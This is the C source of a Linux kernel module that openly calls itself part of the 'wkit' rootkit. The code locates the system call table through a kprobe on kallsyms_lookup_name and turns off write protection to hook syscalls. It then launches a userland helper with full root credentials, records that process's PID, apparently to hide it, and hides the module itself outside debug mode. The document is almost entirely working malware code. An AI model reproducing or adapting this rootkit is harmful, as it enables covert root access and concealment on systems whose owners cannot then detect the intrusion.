/*
 * wkit | kernel module for wkit rootkit 
 * written by ngn (https://ngn.tf) (2024) 
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 *
*/

#include <linux/module.h>       
#include <linux/kprobes.h>
#include <linux/syscalls.h>
#include <linux/unistd.h>
#include <linux/umh.h>

#include "../inc/config.h"
#include "lib/calls.h"
#include "lib/util.h"
#include "lib/procs.h"

MODULE_LICENSE("GPL");

static struct kprobe kp = {
  .symbol_name = "kallsyms_lookup_name"
};

static unsigned long* systable;
typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
kallsyms_lookup_name_t kln;

static int init_func(struct subprocess_info *info, struct cred *new){
  new->uid = new->euid = new->suid = new->fsuid = KUIDT_INIT(0); 
  new->gid = new->egid = new->sgid = new->fsgid = KGIDT_INIT(0);
  add_pid(current->pid);
  print("elevated user pid: %d", current->pid);
  return 0;
}

int init_module(){
  register_kprobe(&kp);
  kln = (kallsyms_lookup_name_t)kp.addr;
  unregister_kprobe(&kp);

  if(NULL == kln){
    print("kallsysms not found");
    return -1;
  }

  print("loaded module");
  systable = kln("sys_call_table");
  if(NULL == systable){
    print("systable not found");
    return -1;  
  }
  print("systable is at: 0x%px", systable);

  unsetwp();
  setup_calls(systable);
  setwp();

  struct subprocess_info *sub_info;
  int ret = 0;

  char cmd[strlen(USUM)+10];
  sprintf(cmd, "/bin/%s", USUM);
  char *argv[] = {cmd, NULL};
  static char *envp[] = {"HOME=/", "TERM=linux",
    "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};

  sub_info = call_usermodehelper_setup(argv[0], argv, envp, GFP_ATOMIC,
    init_func, NULL, NULL);
  if (sub_info == NULL) return -ENOMEM;
  ret = call_usermodehelper_exec(sub_info, UMH_WAIT_EXEC);
  if (ret < 0){
    print("call to userland failed, exiting"); 
    cleanup_module();
    return -1;
  }

  if(!DEBUG) hideself();
  return 0;
}

void cleanup_module(){
  unsetwp();
  clean_calls(systable);
  setwp();
  clean_pids();
  print("unloaded module");
}
